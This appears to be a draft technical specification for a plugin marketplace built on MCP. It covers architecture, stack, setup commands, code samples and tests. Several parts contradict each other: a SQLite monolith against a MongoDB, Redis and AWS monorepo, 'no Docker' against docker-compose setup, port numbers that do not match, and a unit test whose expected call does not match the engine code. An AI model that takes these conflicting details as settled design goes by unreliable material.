# menon-market - Technical Specification

**Author:** Eduardo Menoncello
**Date:** 2025-10-26
**Project Level:** 1
**Project Type:** software
**Development Context:** greenfield

---

## Source Tree Structure

```
menon-market/                      # Simplified monolithic structure
├── src/
│   ├── api/                        # REST API endpoints
│   │   ├── routes/
│   │   │   ├── plugins.ts          # Plugin CRUD operations
│   │   │   ├── users.ts            # User management
│   │   │   ├── validation.ts      # Plugin validation
│   │   │   └── analytics.ts        # Usage analytics
│   │   ├── middleware/
│   │   │   ├── auth.ts             # JWT authentication
│   │   │   ├── rateLimit.ts        # Rate limiting
│   │   │   └── errorHandler.ts     # Centralized error handling
│   │   └── server.ts               # Express server setup
│   ├── core/                       # Business logic
│   │   ├── PluginRegistry.ts       # Plugin metadata management
│   │   ├── ValidationEngine.ts     # Single-pass validation
│   │   ├── ConfidenceScorer.ts     # Reliability scoring
│   │   ├── PluginExecutor.ts       # Plugin sandbox execution
│   │   └── SecurityManager.ts      # Plugin security controls
│   ├── database/                   # Database layer
│   │   ├── models/
│   │   │   ├── Plugin.ts           # Plugin data model
│   │   │   ├── User.ts             # User data model
│   │   │   ├── ValidationReport.ts # Validation results
│   │   │   └── Review.ts           # User reviews
│   │   ├── migrations/             # Database migrations
│   │   └── connection.ts           # Database connection (SQLite → PostgreSQL)
│   ├── plugins/                    # Built-in plugins
│   │   ├── research/               # Research plugin
│   │   │   ├── ResearchPlugin.ts
│   │   │   ├── templates/
│   │   │   └── validation-rules.ts
│   │   └── creator/                # Plugin creator tool
│   │       ├── CreatorPlugin.ts
│   │       ├── templates/
│   │       └── code-generator.ts
│   ├── utils/                      # Shared utilities
│   │   ├── logger.ts               # Structured logging
│   │   ├── crypto.ts               # Encryption utilities
│   │   ├── validation.ts           # Input validation
│   │   └── sandbox.ts              # Plugin sandbox
│   └── types/                      # TypeScript definitions
│       ├── plugin.ts               # Plugin types
│       ├── validation.ts           # Validation types
│       ├── api.ts                  # API types
│       └── database.ts             # Database types
├── frontend/                       # Single-page application
│   ├── src/
│   │   ├── components/
│   │   │   ├── PluginCard.tsx      # Plugin display component
│   │   │   ├── SearchBar.tsx       # Search functionality
│   │   │   ├── ValidationReport.tsx # Validation display
│   │   │   └── InstallButton.tsx   # Plugin installation
│   │   ├── pages/
│   │   │   ├── HomePage.tsx         # Plugin discovery
│   │   │   ├── PluginDetail.tsx    # Plugin details and reviews
│   │   │   └── Dashboard.tsx       # User plugin management
│   │   ├── services/
│   │   │   ├── api.ts               # API client
│   │   │   └── auth.ts              # Authentication service
│   │   └── App.tsx                 # Main application
│   ├── package.json
│   ├── vite.config.ts
│   └── index.html
├── tests/                          # Test suites
│   ├── unit/                       # Unit tests
│   │   ├── validation-engine.test.ts
│   │   ├── plugin-executor.test.ts
│   │   └── api-routes.test.ts
│   ├── integration/                # Integration tests
│   │   ├── plugin-workflow.test.ts
│   │   └── validation-pipeline.test.ts
│   └── e2e/                        # End-to-end tests
│       └── user-journey.test.ts
├── scripts/                        # Utility scripts
│   ├── setup.sh                    # Development setup
│   ├── build.sh                    # Build production bundle
│   ├── deploy.sh                   # Deploy to production
│   └── migrate-db.sh               # Database migrations
├── docs/                           # Documentation
│   ├── api.md                      # API documentation
│   ├── plugin-development.md       # Plugin development guide
│   └── validation.md              # Validation process
├── data/                           # Runtime data
│   ├── database.sqlite             # SQLite database (development)
│   ├── plugins/                    # Plugin storage
│   └── uploads/                    # User uploads
├── package.json                    # Dependencies and scripts
├── tsconfig.json                   # TypeScript configuration
├── .env.example                    # Environment variables template
└── README.md                       # Project documentation
```

---

## Technical Approach

Menon-market implements a **simplified monolithic architecture** with **direct API communication** between components. The system prioritizes **simplicity and reliability** over complexity, using **standard REST APIs** for plugin execution and **transparent validation** for trust building. This approach delivers 80% of the value with 20% of the complexity, enabling faster market entry and iterative improvement.

### First-Principles Architecture Decisions

**Core Design Philosophy**:
- **Simplicity First**: Single Node.js application with SQLite database
- **Transparency Focus**: Clear validation reports and confidence scoring
- **Iterative Enhancement**: Start simple, add complexity only when needed
- **Developer Experience**: Fast setup and easy debugging over distributed complexity

**Migration Path**:
- **Initial**: SQLite + single process deployment
- **Scale Path**: PostgreSQL when user count > 10K
- **Advanced Features**: Added based on user feedback, not assumptions

### Simplified Architectural Patterns

1. **Direct Execution Pattern**: Plugins execute in controlled Node.js VM environment with transparent validation
2. **Single-Pass Validation**: Efficient validation with confidence scoring and detailed reporting
3. **Simplified Sandbox Pattern**: Node.js VM sandboxing with restricted API access and resource limits
4. **Direct API Communication**: REST-based communication without message queue complexity

### Simplified Anti-Hallucination Strategy

The system implements **single-pass validation** with transparent confidence scoring. Instead of complex dual-agent systems, validation focuses on:
- **Static Code Analysis**: Pattern-based detection of obvious issues
- **Execution Testing**: Run plugins with sample inputs to verify behavior
- **Confidence Scoring**: 0-100 score based on analysis depth and results
- **Human Escalation**: Clear thresholds for manual review of low-confidence plugins

### REST API Integration

Simplified communication using standard REST APIs:
- **Plugin Discovery**: GET /api/plugins with search and filtering
- **Plugin Execution**: POST /api/plugins/{id}/execute with direct response
- **Status Checking**: GET /api/plugins/{id}/status for long-running tasks
- **Validation Reports**: GET /api/plugins/{id}/validation for transparency

### Simplified Data Flow

1. **Plugin Search** → Filter by reliability score → Display results
2. **Plugin Selection** → Show validation report → One-click install
3. **Plugin Execution** → Direct API call → Return results with confidence
4. **User Feedback** → Update reliability scores → Improve recommendations

---

## Implementation Stack

### Frontend (Marketplace UI)
- **Framework**: React 19.2.0 with TypeScript 5.9.3
- **Build Tool**: Vite 7.1.12
- **State Management**: Zustand 4.4.1+
- **UI Components**: Tailwind CSS 4.1.16 + Headless UI 1.7.15+
- **HTTP Client**: Axios 1.5.0+
- **Form Handling**: React Hook Form 7.45.4+
- **Routing**: React Router 6.15.0+

### Backend (API Server)
- **Runtime**: Node.js 22.20.0 (LTS) / v25.0.0 (Current)
- **Framework**: Express.js 5.1.0
- **Language**: TypeScript 5.9.3
- **Package Manager**: Bun 1.0.3+
- **Database**: MongoDB 8.2 with Mongoose 7.5.0+
- **Authentication**: Passport.js 0.6.0+ + JWT (jsonwebtoken 9.0.2+)
- **Message Queue**: Redis 8.2
- **File Storage**: AWS S3 (aws-sdk 2.1450.0+)

### MCP Protocol Implementation
- **Core Library**: Custom MCP client/server implementation
- **Serialization**: JSON Schema Draft 2020-12
- **Transport**: WebSocket (ws 8.13.0+) + HTTP/2
- **Security**: TLS 1.3 + Certificate-based authentication

### Plugin Infrastructure
- **Sandboxing**: Node.js VM sandboxing (primary) / Docker 27.x (fallback)
- **Process Isolation**: Node.js Worker Threads 20.6.0+
- **Security**: Content Security Policy + Input validation (joi 17.9.2+)
- **Monitoring**: Winston 3.10.0+ + Elastic APM integration

### Development & Deployment
- **Containerization**: Docker 27.x (for production deployment)
- **Orchestration**: Kubernetes 1.28+ with AWS EKS (when scaling needed)
- **Infrastructure**: Terraform 1.5.5+ (AWS provider 5.17.0+)
- **CI/CD**: GitHub Actions (self-hosted runners)
- **Testing**: Jest 29.6.4+ + Playwright 1.38.0+
- **Code Quality**: ESLint 8.48.0+ + Prettier 3.0.3+

### Monitoring & Observability
- **Logging**: Winston 3.10.0+ with structured JSON output
- **Metrics**: Prometheus 2.47.0+ + Grafana 10.1.2+
- **Tracing**: OpenTelemetry 1.21.0+ + Jaeger 1.49.0+
- **Error Tracking**: Sentry 7.66.0+
- **Health Checks**: Custom health monitoring endpoints

### Performance Optimization
- **Caching**: Redis 8.2 for session + application caching
- **CDN**: AWS CloudFront for static assets
- **Load Balancing**: AWS Application Load Balancer
- **Database Optimization**: MongoDB Atlas with auto-scaling
- **Asset Optimization**: Vite build optimization + lazy loading

---

## Technical Details

### MCP Protocol Specification

**Message Format**:
```typescript
interface MCPMessage {
  id: string;
  type: 'request' | 'response' | 'notification';
  method: string;
  params?: Record<string, any>;
  result?: any;
  error?: MCPError;
}
```

**Agent Discovery Protocol**:
```typescript
interface AgentCapability {
  agentId: string;
  agentType: 'research' | 'creator' | 'persona' | 'validator';
  capabilities: string[];
  mcpVersion: string;
  endpoint: string;
  reliability: number; // 0-100 score
}
```

### Anti-Hallucination Validation Engine

**Cross-Validation Process**:
1. **Task Decomposition**: Complex tasks broken into atomic operations
2. **Parallel Execution**: Reviewer and Executor agents work independently
3. **Consensus Validation**: Results compared using semantic similarity algorithms
4. **Discrepancy Resolution**: Automatic retries + human escalation thresholds
5. **Reliability Scoring**: Dynamic reliability scores updated per validation result

**Validation Metrics**:
- **Consensus Rate**: Percentage of validations with >90% agreement
- **Hallucination Detection**: Fact-checking against known documentation
- **Semantic Consistency**: Logical coherence analysis across results
- **Error Pattern Recognition**: ML-based detection of common hallucination patterns

### Plugin Security Model

**Sandbox Execution Environment**:
```yaml
resources:
  memory: "512Mi"
  cpu: "500m"
  timeout: "30s"
  network:
    outbound: ["https://api.anthropic.com", "https://github.com"]
  filesystem:
    readonly: ["/plugin", "/shared"]
    writable: ["/tmp"]
```

**Security Validation Pipeline**:
1. **Code Scanning**: Static analysis for security vulnerabilities
2. **Dependency Verification**: Check for malicious packages
3. **Resource Limits**: Enforce CPU/memory/time constraints
4. **Network Policies**: Restrict external API access
5. **Data Sanitization**: Prevent sensitive data exfiltration

### Database Schema Design

**Plugin Registry Collection**:
```typescript
interface PluginDocument {
  _id: ObjectId;
  name: string;
  version: string;
  author: string;
  type: 'agent' | 'skill' | 'command' | 'plugin';
  mcpHandlers: MCPHandler[];
  validationReports: ValidationReport[];
  reliabilityScore: number;
  downloadCount: number;
  averageRating: number;
  createdAt: Date;
  updatedAt: Date;
}
```

**User Activity Collection**:
```typescript
interface UserActivityDocument {
  _id: ObjectId;
  userId: string;
  action: 'install' | 'uninstall' | 'rate' | 'review';
  pluginId: string;
  metadata: Record<string, any>;
  timestamp: Date;
}
```

### API Rate Limiting

**Rate Limit Configuration**:
```typescript
const rateLimits = {
  authenticated: {
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 1000, // 1000 requests per window
    message: "Too many requests from authenticated user"
  },
  pluginExecution: {
    windowMs: 60 * 1000, // 1 minute
    max: 100, // 100 plugin executions per minute
    message: "Plugin execution rate limit exceeded"
  },
  validationRequests: {
    windowMs: 60 * 1000, // 1 minute
    max: 50, // 50 validation requests per minute
    message: "Validation rate limit exceeded"
  }
};
```

### Error Handling Strategy

**Error Classification**:
- **Critical Errors**: System failures requiring immediate attention
- **Validation Errors**: Plugin failures detected by validation pipeline
- **Performance Errors**: Timeout or resource limit violations
- **User Errors**: Invalid input or authentication failures

**Error Response Format**:
```typescript
interface ErrorResponse {
  error: {
    code: string;
    message: string;
    details?: any;
    timestamp: string;
    requestId: string;
    reliabilityImpact?: boolean;
  };
}
```

---

## Development Setup

**First-Principles Development Environment**

**Ultra-Simple Setup (2 commands)**:
```bash
# 1. Clone and setup
git clone https://github.com/your-org/menon-market.git
cd menon-market
./scripts/setup.sh

# 2. Start development
npm run dev
```

**Prerequisites**:
- Node.js 18+ (LTS recommended)
- Git (for version control)
- Text editor (VS Code recommended)

**That's it!** No Docker, no MongoDB, no Redis, no complex configuration.

**Development Tools**:
- VS Code with extensions:
  - TypeScript and JavaScript Language Features
  - ESLint
  - Prettier
  - Docker
  - MongoDB for VS Code
  - Thunder Client (API testing)

### Environment Setup

**1. Clone Repository**:
```bash
git clone https://github.com/your-org/menon-market.git
cd menon-market
```

**2. Install Dependencies**:
```bash
bun install
```

**3. Environment Configuration**:
```bash
# Copy environment templates
cp .env.example .env.local
cp packages/api-server/.env.example packages/api-server/.env.local
cp packages/marketplace-ui/.env.example packages/marketplace-ui/.env.local

# Configure environment variables
# See Environment Variables section below
```

**4. Database Setup**:
```bash
# Start local development databases
docker-compose -f docker-compose.dev.yml up -d mongodb redis

# Run database migrations
bun run setup:dev
```

**5. Development Servers**:
```bash
# Start all development services
bun run dev

# Or start individual services
bun run dev:api          # API server on port 20200
bun run dev:ui           # Frontend on port 5173
bun run dev:validation   # Validation service on port 20202
```

### Environment Variables

**Root .env.local**:
```env
# Development Configuration
NODE_ENV=development
LOG_LEVEL=debug

# Database Configuration
MONGODB_URI=mongodb://localhost:27017/menon-market-dev
REDIS_URL=redis://localhost:6379

# JWT Configuration
JWT_SECRET=your-super-secret-jwt-key-change-in-production
JWT_EXPIRES_IN=7d

# AWS Configuration (for S3 storage)
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=your-aws-access-key
AWS_SECRET_ACCESS_KEY=your-aws-secret-key
AWS_S3_BUCKET=menon-market-dev

# Claude Code API
ANTHROPIC_API_KEY=your-anthropic-api-key
```

**API Server (.env.local)**:
```env
# API Configuration
API_PORT=20200
API_HOST=localhost

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=1000

# MCP Configuration
MCP_SERVER_PORT=20201
MCP_PROTOCOL_VERSION=1.0

# Plugin Security
PLUGIN_SANDBOX_TIMEOUT=30000
PLUGIN_MAX_MEMORY_MB=512
PLUGIN_MAX_CPU_PERCENT=50
```

**Frontend (.env.local)**:
```env
# API Configuration
VITE_API_BASE_URL=http://localhost:20200
VITE_MCP_WS_URL=ws://localhost:20201

# Feature Flags
VITE_ENABLE_ANALYTICS=false
VITE_ENABLE_DEBUG=true
```

### Development Scripts

**Available Commands**:
```bash
# Development
bun run dev              # Start all services in development mode
bun run dev:api          # Start API server only
bun run dev:ui           # Start frontend only
bun run dev:validation   # Start validation service only

# Building
bun run build            # Build all packages for production
bun run build:api        # Build API server
bun run build:ui         # Build frontend

# Testing
bun run test             # Run all tests
bun run test:unit        # Unit tests only
bun run test:integration # Integration tests only
bun run test:e2e         # End-to-end tests
bun run test:coverage    # Tests with coverage report

# Database
bun run setup:dev        # Initialize development database
bun run migrate:up       # Run database migrations
bun run migrate:down     # Rollback database migrations
bun run seed:dev         # Seed development data

# Code Quality
bun run lint             # Run ESLint
bun run lint:fix         # Auto-fix ESLint issues
bun run format           # Format code with Prettier
bun run type-check       # TypeScript type checking
```

### Database Setup

**Local Development**:
```bash
# Using Docker Compose
docker-compose -f docker-compose.dev.yml up -d mongodb redis

# Manual MongoDB setup
mongosh
use menon-market-dev
db.createUser({
  user: "devuser",
  pwd: "devpass",
  roles: [{ role: "readWrite", db: "menon-market-dev" }]
})
```

**Development Collections**:
- `plugins` - Plugin registry and metadata
- `users` - User accounts and profiles
- `validations` - Validation reports and results
- `activities` - User activity logs
- `reliability` - Agent reliability scores

### Hot Reload Configuration

**Frontend (Vite)**:
- Automatic hot module replacement (HMR)
- Fast refresh for React components
- CSS hot reloading

**Backend (Nodemon)**:
- Automatic server restart on file changes
- TypeScript compilation in watch mode
- Environment variable reloading

**MCP Services**:
- WebSocket connection reconnection
- Agent hot-swapping for development
- Configuration reload without restart

---

## Implementation Guide

### Phase 1: Core Infrastructure (Week 1-2)

**1.1 Project Setup**:
```bash
# Initialize monorepo structure
bun create menon-market
cd menon-market

# Configure workspace
# packages/marketplace-ui/
# packages/api-server/
# packages/mcp-protocol/
# packages/validation-system/
# shared/
```

**1.2 Database Schema Implementation**:
```typescript
// shared/types/plugin.ts
export interface Plugin {
  _id: ObjectId;
  name: string;
  version: string;
  author: string;
  type: PluginType;
  mcpHandlers: MCPHandler[];
  reliabilityScore: number;
  createdAt: Date;
  updatedAt: Date;
}

// packages/api-server/src/models/Plugin.ts
import mongoose from 'mongoose';
import { Plugin as IPlugin } from '../../../shared/types/plugin';

const pluginSchema = new mongoose.Schema<IPlugin>({
  name: { type: String, required: true, unique: true },
  version: { type: String, required: true },
  author: { type: String, required: true },
  type: { type: String, enum: ['agent', 'skill', 'command', 'plugin'] },
  mcpHandlers: [{ type: mongoose.Schema.Types.Mixed }],
  reliabilityScore: { type: Number, default: 100 },
  downloadCount: { type: Number, default: 0 },
  averageRating: { type: Number, default: 0 }
});

export const Plugin = mongoose.model<IPlugin>('Plugin', pluginSchema);
```

**1.3 MCP Protocol Implementation**:
```typescript
// packages/mcp-protocol/src/MCPClient.ts
export class MCPClient {
  private ws: WebSocket;
  private messageHandlers: Map<string, Function>;

  constructor(endpoint: string) {
    this.ws = new WebSocket(endpoint);
    this.messageHandlers = new Map();
    this.setupEventHandlers();
  }

  async sendRequest<T>(method: string, params?: any): Promise<T> {
    const message: MCPMessage = {
      id: generateId(),
      type: 'request',
      method,
      params
    };

    return new Promise((resolve, reject) => {
      this.messageHandlers.set(message.id, { resolve, reject });
      this.ws.send(JSON.stringify(message));
    });
  }

  async discoverAgents(): Promise<AgentCapability[]> {
    return this.sendRequest<AgentCapability[]>('agents/discover');
  }
}
```

### Phase 2: Validation System (Week 3-4)

**2.1 Anti-Hallucination Engine**:
```typescript
// packages/validation-system/src/ValidationEngine.ts
export class ValidationEngine {
  private reviewerAgent: ReviewerAgent;
  private executorAgent: ExecutorAgent;
  private consensusChecker: ConsensusChecker;

  async validateTask(task: Task): Promise<ValidationResult> {
    // Decompose task into atomic operations
    const atomicTasks = await this.decomposeTask(task);

    // Execute in parallel by different agents
    const [reviewerResult, executorResult] = await Promise.all([
      this.reviewerAgent.execute(atomicTasks),
      this.executorAgent.execute(atomicTasks)
    ]);

    // Check consensus and calculate reliability
    const consensus = await this.consensusChecker.compare(
      reviewerResult,
      executorResult
    );

    return {
      consensus: consensus.score,
      reliability: consensus.reliability,
      discrepancies: consensus.discrepancies,
      recommendation: consensus.score > 0.9 ? 'approve' : 'review'
    };
  }
}
```

**2.2 Agent Reliability Scoring**:
```typescript
// packages/validation-system/src/ReliabilityScorer.ts
export class ReliabilityScorer {
  async updateAgentScore(
    agentId: string,
    validationResult: ValidationResult
  ): Promise<void> {
    const currentScore = await this.getAgentScore(agentId);
    const adjustment = this.calculateScoreAdjustment(validationResult);
    const newScore = Math.max(0, Math.min(100, currentScore + adjustment));

    await this.saveAgentScore(agentId, newScore);
  }

  private calculateScoreAdjustment(result: ValidationResult): number {
    if (result.consensus > 0.95) return +2;
    if (result.consensus > 0.9) return +1;
    if (result.consensus > 0.8) return 0;
    if (result.consensus > 0.7) return -1;
    return -2;
  }
}
```

### Phase 3: Core Plugins (Week 5-6)

**3.1 Research Plugin Implementation**:
```typescript
// packages/plugin-research/src/ResearchAgent.ts
export class ResearchAgent {
  async performResearch(query: ResearchQuery): Promise<ResearchResult> {
    // Multi-source research strategy
    const sources = await this.identifySources(query);
    const researchTasks = sources.map(source =>
      this.researchSource(source, query)
    );

    const results = await Promise.all(researchTasks);
    return this.synthesizeResults(results, query);
  }

  private async synthesizeResults(
    results: SourceResult[],
    query: ResearchQuery
  ): Promise<ResearchResult> {
    return {
      query: query.text,
      summary: await this.generateSummary(results),
      technicalDetails: await this.extractTechnicalDetails(results),
      codeExamples: await this.extractCodeExamples(results),
      references: results.map(r => r.source),
      reliability: this.calculateReliability(results)
    };
  }
}
```

**3.2 Plugin Creator Implementation**:
```typescript
// packages/plugin-creator/src/CreatorAgent.ts
export class CreatorAgent {
  async createPlugin(specification: PluginSpec): Promise<PluginPackage> {
    // Template selection based on plugin type
    const template = await this.templateEngine.selectTemplate(specification);

    // Code generation using templates
    const pluginCode = await this.codeGenerator.generate(template, specification);

    // Validation before packaging
    const validation = await this.validatePlugin(pluginCode);

    if (validation.isValid) {
      return this.packagePlugin(pluginCode, specification);
    } else {
      throw new Error(`Plugin validation failed: ${validation.errors.join(', ')}`);
    }
  }
}
```

### Phase 4: Marketplace UI (Week 7-8)

**4.1 Plugin Discovery Components**:
```typescript
// packages/marketplace-ui/src/components/PluginCard.tsx
export const PluginCard: React.FC<{ plugin: Plugin }> = ({ plugin }) => {
  return (
    <div className="bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition-shadow">
      <div className="flex justify-between items-start mb-4">
        <h3 className="text-lg font-semibold">{plugin.name}</h3>
        <ReliabilityBadge score={plugin.reliabilityScore} />
      </div>

      <p className="text-gray-600 mb-4">{plugin.description}</p>

      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <RatingStars rating={plugin.averageRating} />
          <span className="text-sm text-gray-500">
            {plugin.downloadCount} downloads
          </span>
        </div>

        <InstallButton pluginId={plugin._id} />
      </div>
    </div>
  );
};
```

**4.2 Plugin Installation System**:
```typescript
// packages/marketplace-ui/src/hooks/usePluginInstallation.ts
export const usePluginInstallation = () => {
  const [installing, setInstalling] = useState<Set<string>>(new Set());

  const installPlugin = async (pluginId: string) => {
    setInstalling(prev => new Set(prev).add(pluginId));

    try {
      const response = await api.post('/plugins/install', { pluginId });

      // Trigger MCP handler registration
      await mcpClient.registerPlugin(response.data.plugin);

      toast.success('Plugin installed successfully!');
    } catch (error) {
      toast.error('Failed to install plugin');
    } finally {
      setInstalling(prev => {
        const next = new Set(prev);
        next.delete(pluginId);
        return next;
      });
    }
  };

  return { installPlugin, installing };
};
```

### Phase 5: Integration & Testing (Week 9-10)

**5.1 End-to-End Testing**:
```typescript
// tests/e2e/plugin-workflow.test.ts
describe('Plugin Installation Workflow', () => {
  test('Complete plugin discovery and installation', async () => {
    // 1. Discover plugins
    const plugins = await request(app)
      .get('/api/plugins')
      .expect(200);

    // 2. Install plugin
    const installResponse = await request(app)
      .post('/api/plugins/install')
      .send({ pluginId: plugins.body[0]._id })
      .expect(200);

    // 3. Verify MCP registration
    const registeredAgents = await mcpClient.discoverAgents();
    expect(registeredAgents).toContainEqual(
      expect.objectContaining({
        agentId: installResponse.body.plugin.agentId
      })
    );

    // 4. Test plugin functionality
    const result = await mcpClient.sendRequest('plugin/execute', {
      agentId: installResponse.body.plugin.agentId,
      task: 'test-task'
    });

    expect(result.success).toBe(true);
  });
});
```

### Implementation Milestones

**Week 1**: Project structure + database setup
**Week 2**: MCP protocol implementation + basic API
**Week 3**: Validation system core functionality
**Week 4**: Anti-hallucination engine + reliability scoring
**Week 5**: Research plugin implementation
**Week 6**: Plugin Creator implementation
**Week 7**: Marketplace UI core components
**Week 8**: Plugin installation + management features
**Week 9**: Integration testing + performance optimization
**Week 10**: Security testing + deployment preparation

### Quality Gates

Each phase must pass:
- **Unit Test Coverage**: >90%
- **Integration Tests**: All critical paths
- **Security Review**: Static analysis + penetration testing
- **Performance Tests**: <2s response time for API calls
- **Reliability Validation**: <5% hallucination rate in validation system

---

## Testing Approach

### Testing Strategy Overview

Menon-market implements a **comprehensive testing strategy** with multiple layers of validation to ensure the reliability and security of the marketplace platform and its plugins. The testing approach emphasizes reliability validation for the anti-hallucination system and security testing for plugin sandboxing.

### Test Pyramid Structure

**1. Unit Tests (70%)**:
- Individual component testing in isolation
- Fast feedback loop for developers
- High coverage of business logic
- Mock external dependencies

**2. Integration Tests (20%)**:
- Service-to-service communication testing
- Database integration validation
- MCP protocol message passing
- Plugin validation pipeline testing

**3. End-to-End Tests (10%)**:
- Complete user workflows
- Cross-service functionality
- Real browser interactions
- Performance validation

### Unit Testing Framework

**Technology Stack**:
- **Test Runner**: Jest 29.6.4 with TypeScript support
- **Mocking**: Jest mocks + MSW for API mocking
- **Assertion Library**: Jest built-in matchers + @testing-library/jest-dom
- **Coverage**: Jest coverage with istanbul

**Test Structure**:
```typescript
// packages/validation-system/src/__tests__/ValidationEngine.test.ts
describe('ValidationEngine', () => {
  let validationEngine: ValidationEngine;
  let mockReviewerAgent: jest.Mocked<ReviewerAgent>;
  let mockExecutorAgent: jest.Mocked<ExecutorAgent>;

  beforeEach(() => {
    mockReviewerAgent = createMockReviewerAgent();
    mockExecutorAgent = createMockExecutorAgent();
    validationEngine = new ValidationEngine(mockReviewerAgent, mockExecutorAgent);
  });

  describe('validateTask', () => {
    it('should return high consensus when agents agree', async () => {
      // Arrange
      const task = createTestTask();
      const expectedResult = createTestResult();

      mockReviewerAgent.execute.mockResolvedValue(expectedResult);
      mockExecutorAgent.execute.mockResolvedValue(expectedResult);

      // Act
      const result = await validationEngine.validateTask(task);

      // Assert
      expect(result.consensus).toBeGreaterThan(0.95);
      expect(result.recommendation).toBe('approve');
      expect(mockReviewerAgent.execute).toHaveBeenCalledWith(task);
      expect(mockExecutorAgent.execute).toHaveBeenCalledWith(task);
    });

    it('should detect hallucination when agents disagree significantly', async () => {
      // Arrange
      const task = createTestTask();
      const reviewerResult = createTestResult({ data: 'result-A' });
      const executorResult = createTestResult({ data: 'result-B' });

      mockReviewerAgent.execute.mockResolvedValue(reviewerResult);
      mockExecutorAgent.execute.mockResolvedValue(executorResult);

      // Act
      const result = await validationEngine.validateTask(task);

      // Assert
      expect(result.consensus).toBeLessThan(0.8);
      expect(result.recommendation).toBe('review');
      expect(result.discrepancies).toHaveLength(1);
    });
  });
});
```

### Integration Testing

**API Integration Tests**:
```typescript
// packages/api-server/src/__tests__/integration/plugins.test.ts
describe('Plugins API Integration', () => {
  let app: Express;
  let db: MongoMemoryServer;

  beforeAll(async () => {
    db = await MongoMemoryServer.create();
    app = await createTestApp(db.getUri());
  });

  afterAll(async () => {
    await db.stop();
  });

  describe('POST /api/plugins/install', () => {
    it('should install plugin and register MCP handlers', async () => {
      // Arrange
      const plugin = await createTestPlugin({ type: 'research' });
      await plugin.save();

      // Act
      const response = await request(app)
        .post('/api/plugins/install')
        .send({ pluginId: plugin._id })
        .expect(200);

      // Assert
      expect(response.body.success).toBe(true);
      expect(response.body.plugin).toBeDefined();

      // Verify MCP registration
      const mcpServer = app.get('mcpServer');
      const registeredAgents = await mcpServer.getRegisteredAgents();
      expect(registeredAgents).toContainEqual(
        expect.objectContaining({
          agentId: response.body.plugin.agentId,
          type: 'research'
        })
      );
    });
  });
});
```

**MCP Protocol Integration Tests**:
```typescript
// packages/mcp-protocol/src/__tests__/integration/MCPClient.test.ts
describe('MCP Client Integration', () => {
  let mcpServer: MCPServer;
  let mcpClient: MCPClient;

  beforeAll(async () => {
    mcpServer = new MCPServer({ port: 3011 });
    await mcpServer.start();

    mcpClient = new MCPClient('ws://localhost:3011');
    await mcpClient.connect();
  });

  afterAll(async () => {
    await mcpClient.disconnect();
    await mcpServer.stop();
  });

  it('should discover and communicate with agents', async () => {
    // Register test agent
    const testAgent = new TestAgent();
    await mcpServer.registerAgent(testAgent);

    // Discover agents
    const agents = await mcpClient.discoverAgents();
    expect(agents).toContainEqual(
      expect.objectContaining({
        agentId: testAgent.getId(),
        capabilities: expect.arrayContaining(['research'])
      })
    );

    // Send task to agent
    const result = await mcpClient.sendRequest('agent/execute', {
      agentId: testAgent.getId(),
      task: { type: 'research', query: 'React hooks' }
    });

    expect(result.success).toBe(true);
    expect(result.data).toBeDefined();
  });
});
```

### End-to-End Testing

**E2E Test Framework**:
- **Tool**: Playwright 1.38.0
- **Browsers**: Chromium, Firefox, Safari
- **Environment**: Docker containers with real database
- **Reporting**: Playwright HTML reports + screenshots

**E2E Test Scenarios**:
```typescript
// tests/e2e/marketplace-workflow.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Marketplace Plugin Workflow', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('complete plugin discovery and installation workflow', async ({ page }) => {
    // 1. Search for plugins
    await page.fill('[data-testid="search-input"]', 'research');
    await page.click('[data-testid="search-button"]');

    // 2. Verify plugin results
    await expect(page.locator('[data-testid="plugin-card"]')).toHaveCount(3);

    // 3. Install first plugin
    await page.click('[data-testid="plugin-card"]:first-child [data-testid="install-button"]');

    // 4. Wait for installation confirmation
    await expect(page.locator('[data-testid="toast-success"]')).toBeVisible({
      timeout: 10000
    });

    // 5. Verify plugin appears in installed plugins
    await page.click('[data-testid="my-plugins-tab"]');
    await expect(page.locator('[data-testid="installed-plugin"]')).toHaveCount(1);

    // 6. Test plugin functionality
    await page.click('[data-testid="installed-plugin"] [data-testid="use-plugin"]');
    await page.fill('[data-testid="plugin-input"]', 'React testing');
    await page.click('[data-testid="execute-plugin"]');

    // 7. Verify plugin execution results
    await expect(page.locator('[data-testid="plugin-result"]')).toBeVisible({
      timeout: 15000
    });
  });

  test('validation system prevents hallucination', async ({ page }) => {
    // This test would require specific setup to trigger validation scenarios
    // Implementation depends on validation system integration points
  });
});
```

### Performance Testing

**Load Testing Strategy**:
- **Tool**: k6 for API load testing
- **Metrics**: Response time, throughput, error rates
- **Scenarios**: Peak load, stress testing, soak testing

**k6 Test Script**:
```javascript
// tests/performance/marketplace-load-test.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');

export let options = {
  stages: [
    { duration: '2m', target: 100 }, // Ramp up to 100 users
    { duration: '5m', target: 100 }, // Stay at 100 users
    { duration: '2m', target: 200 }, // Ramp up to 200 users
    { duration: '5m', target: 200 }, // Stay at 200 users
    { duration: '2m', target: 0 },   // Ramp down
  ],
  thresholds: {
    http_req_duration: ['p(95)<2000'], // 95% of requests under 2s
    http_req_failed: ['rate<0.1'],     // Error rate under 10%
    errors: ['rate<0.1'],
  },
};

export default function() {
  // Test plugin discovery
  let response = http.get('http://localhost:3001/api/plugins', {
    headers: { 'Content-Type': 'application/json' }
  });

  let success = check(response, {
    'plugin discovery status is 200': (r) => r.status === 200,
    'plugin discovery response time < 500ms': (r) => r.timings.duration < 500,
  });

  errorRate.add(!success);

  // Test plugin installation
  response = http.post('http://localhost:3001/api/plugins/install',
    JSON.stringify({ pluginId: 'test-plugin-id' }),
    { headers: { 'Content-Type': 'application/json' } }
  );

  success = check(response, {
    'plugin installation status is 200': (r) => r.status === 200,
    'plugin installation response time < 2000ms': (r) => r.timings.duration < 2000,
  });

  errorRate.add(!success);

  sleep(1);
}
```

### Security Testing

**Security Test Coverage**:
- **Static Analysis**: ESLint security rules + npm audit
- **Dependency Scanning**: Snyk for vulnerable dependencies
- **Dynamic Testing**: OWASP ZAP for runtime vulnerabilities
- **Penetration Testing**: Manual security assessment

**Security Test Examples**:
```typescript
// tests/security/plugin-sandbox.test.ts
